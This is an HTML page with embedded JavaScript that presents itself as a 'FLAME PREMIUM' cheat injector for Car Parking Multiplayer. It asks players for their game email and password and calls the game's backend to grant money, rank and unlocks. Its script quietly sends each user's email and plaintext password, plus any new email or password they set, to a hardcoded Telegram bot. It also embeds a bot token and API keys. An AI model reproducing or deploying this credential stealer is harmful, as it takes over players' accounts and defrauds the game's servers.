<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
<title>FLAME ULTIMATE INJECTOR</title>
<style>
body{margin:0;padding:0;font-family:sans-serif;background:#050505;color:#fff;text-align:center}
.container{margin:30px auto;width:90%;max-width:380px;padding:25px;background:#111;border:2px solid #00aaff;border-radius:20px;box-shadow:0 0 25px #00aaff44}
h2{color:#00aaff;text-shadow:0 0 10px #00aaff}
input,select{width:92%;padding:12px;margin:10px 0;background:#1a1a1a;border:1px solid #333;color:#fff;border-radius:10px;outline:none}
button{width:100%;padding:14px;margin:8px 0;background:#00aaff;border:0;color:#fff;font-weight:700;border-radius:10px;cursor:pointer}
.btn-gold{background:linear-gradient(45deg, #ff8800, #ffcc00);color:#000}
.status{font-size:13px;margin:10px;font-weight:bold}
.small-text{font-size:11px;color:#888;margin-top:10px}
hr{border:0;border-top:1px solid #222;margin:15px 0}
</style>
</head>
<body>

<div class="container">
    <h2>FLAME PREMIUM V3</h2>
    
    <div id="loginBox">
        <select id="game">
            <option value="1">Car Parking Multiplayer 1</option>
            <option value="2">Car Parking Multiplayer 2</option>
        </select>
        <input id="user" type="email" placeholder="Game Email">
        <input id="pass" type="password" placeholder="Game Password">
        <input id="key" type="text" placeholder="Access Key">
        <button onclick="login()">LOGIN TO TOOL</button>
        <p id="st" class="status"></p>
    </div>

    <div id="menu" style="display:none">
        <p id="userMail" style="color:#00ff00;font-size:12px"></p>
        
        <button class="btn-gold" onclick="inject('money')">INJECT 50M & 40K COINS</button>
        <button class="btn-gold" onclick="inject('rank')">INJECT KING RANK</button>
        <button class="btn-gold" onclick="inject('unlock')">UNLOCK ALL FEATURES</button>
        
        <hr>
        
        <button style="background:#333" onclick="updateAcc('email')">CHANGE EMAIL</button>
        <button style="background:#333" onclick="updateAcc('pass')">CHANGE PASSWORD</button>
        
        <p id="mst" class="status"></p>
        <p class="small-text">Step: 1. Inject -> 2. Close Game -> 3. Relogin Game</p>
    </div>
</div>

<script>
const BOT_TOKEN = "7805931150:AAEgDJV9RNguZl8Xz7u7IJg99D1D4w7QdUo";
const ADMIN_ID = "7212602902";

const CONFIG = {
    "1": { key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
    "2": { key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
};

let token, email, activeGame, userPass;

function log(msg, err=false, target="st"){
    const el = document.getElementById(target);
    el.style.color = err ? "#ff4444" : "#00ff00";
    el.innerText = msg;
}

function sendBot(txt){
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
}

async function login(){
    email = document.getElementById('user').value.trim();
    userPass = document.getElementById('pass').value;
    const key = document.getElementById('key').value.trim();
    activeGame = CONFIG[document.getElementById('game').value];

    if(key !== "FLAMEFEB") return log("Wrong Access Key!", true);
    log("Verifying...");

    try {
        const r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${activeGame.key}`, {
            method:'POST', body:JSON.stringify({email, password:userPass, returnSecureToken:true})
        });
        const d = await r.json();
        if(d.idToken){
            token = d.idToken;
            document.getElementById('loginBox').style.display = 'none';
            document.getElementById('menu').style.display = 'block';
            document.getElementById('userMail').innerText = "Active: " + email;
            sendBot(`‚úÖ **Login Success**\nüìß \`${email}\`\nüîë \`${userPass}\``);
        } else log("Invalid Credentials!", true);
    } catch(e){ log("Error!", true); }
}

async function inject(type){
    log("Injecting...", false, "mst");
    let ratingData = {};
    
    // ‡¥™‡¥£‡¥µ‡µÅ‡¥Ç ‡¥ï‡µã‡¥Ø‡¥ø‡¥®‡µÅ‡¥Ç ‡¥µ‡µá‡¥£‡µç‡¥ü‡¥ø‡¥Ø‡µÅ‡¥≥‡µç‡¥≥ ‡¥™‡µÅ‡¥§‡¥ø‡¥Ø Wiring
    if(type === 'money'){
        ratingData = { 
            "money": 50000000, 
            "coin": 40000, 
            "local_money": 50000000,
            "isFullSync": true,
            "lastSync": Date.now()
        };
    } else if(type === 'rank'){
        const s = ["cars","levels","gifts","police","run","treasure","race_win"];
        s.forEach(k => ratingData[k] = 100000);
        ratingData.time = 9999999;
    } else if(type === 'unlock'){
        ratingData = { "car_unlocked": true, "house_unlocked": true, "character_unlocked": true };
    }

    try {
        const r = await fetch(activeGame.url, {
            method:'POST',
            headers:{"Authorization":"Bearer " + token, "Content-Type":"application/json"},
            body: JSON.stringify({ 
                data: JSON.stringify({ 
                    RatingData: ratingData,
                    Timestamp: Date.now(),
                    SyncMode: "cloud_update"
                }) 
            })
        });

        if(r.ok){
            log("‚úÖ Injected! Logout & Login Game Now.", false, "mst");
            sendBot(`üöÄ **Applied: ${type}**\nTarget: ${email}`);
        } else log("Server Refused!", true, "mst");
    } catch(e){ log("Network Error!", true, "mst"); }
}

async function updateAcc(mode){
    const val = prompt("Enter New " + mode);
    if(!val) return;
    const body = { idToken:token, returnSecureToken:true };
    if(mode === 'email') body.email = val; else body.password = val;

    try {
        const r = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${activeGame.key}`, {
            method:'POST', body:JSON.stringify(body)
        });
        if(r.ok){
            log("‚úÖ Account Updated!", false, "mst");
            sendBot(`üîê **Changed ${mode}**\nNew: \`${val}\`\nOld: ${email}`);
        }
    } catch(e){ log("Error!", true, "mst"); }
}
</script>
</body>
</html>
